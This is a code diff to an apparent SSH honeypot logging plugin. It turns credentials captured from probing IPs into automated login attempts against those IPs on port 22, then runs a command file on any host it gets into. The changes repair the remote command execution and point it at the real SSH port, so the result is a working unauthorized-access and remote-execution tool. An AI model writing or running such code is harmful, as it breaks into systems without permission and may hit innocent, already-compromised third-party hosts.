@@ -21,6 +21,7 @@ from twisted.enterprise import adbapi
 from twisted.internet import defer
 from twisted.python import log
 from paramiko import SSHClient
+from paramiko import SSHException
 from paramiko import AutoAddPolicy
 
 import time
@@ -33,6 +34,8 @@ class UserIpCombination:
         self.usernames = []
         self.passwords = []
         self.amount = 0
+        self.usernames.append(username)
+        self.passwords.append(password)
 
     def reset(self):
         self.usernames = []
@@ -42,8 +45,8 @@ class UserIpCombination:
 class Connection (Thread):
 
     def __init__(self,combination,cfg):
-        super(Connection, self).__init__()
-        self.portNumber  = 2222
+        Thread.__init__(self)
+        self.portNumber  = 22
         self.timeoutTime = 5
         self.target = combination.target
         self.combination = combination
@@ -57,28 +60,37 @@ class Connection (Thread):
 
                 sshConnection.set_missing_host_key_policy(AutoAddPolicy())     
                 try:
+                    logging.info('[+] Attempted access to: %s using %s:%s' % (self.target,usernameC,passwordC))
                     sshConnection.connect(self.target, port = self.portNumber, username = usernameC,password = passwordC, timeout = self.timeoutTime, allow_agent = False,look_for_keys = False)
                     logging.info("[+] Access granted from: %s" % self.target)
                     self.commandsToExecute(sshConnection)
                     sshConnection.close()
+                except AttributeError,a:
+                    logging.debug(a)
+                except SSHException, e:
+                    logging.debug(e)
                 except:      
-                    pass
+                   logging.debug(sys.exc_info()[0])
 
-    def commandsToExecute(sshConnection):    
-        commandFile = cfg.get('database_deity', 'commandFile')
-        commandFileVerbose = cfg.get('database_deity', 'commandFileVerbose')
+    def commandsToExecute(self,sshConnection):
+        commandFile = self.cfg.get('database_deity', 'commandFile')
+        commandFileVerbose = self.cfg.get('database_deity', 'commandFileVerbose')
         
         if commandFile is not None:
             logging.info('[+] Executing runscript on %s' % self.target)
             file = open(commandFile, 'r')
             for line in file:
-                if commandFileVerbose == True:
-                    stdin, stdout, stderr = client.exec_comm1and(line)
-                    for line in stdout:
-                        logging.info('[-] Execution %s: %s' % (self.target,line)
+                if bool(commandFileVerbose):
+                    channel = sshConnection.get_transport().open_session()
+                    channel.exec_command(line)
+                    logging.info('[-] Executed %s: %s' % (self.target,line.strip()))
                 else:
-                    client.exec_command(line)
+                    channel = sshConnection.get_transport().open_session()
+                    channel.exec_command(line)
+
             logging.info('[+] Completed execution on %s' % self.target)
+
+        sshConnection.close()
 
 class Deity:
 
@@ -111,6 +123,7 @@ class Deity:
 
         if found == False:
             combination = UserIpCombination(ip,username,password)
+            combination.amount = combination.amount + 1
             self.currentCombinations.append(combination)
 
 class DBLogger(dblog.DBLogger):
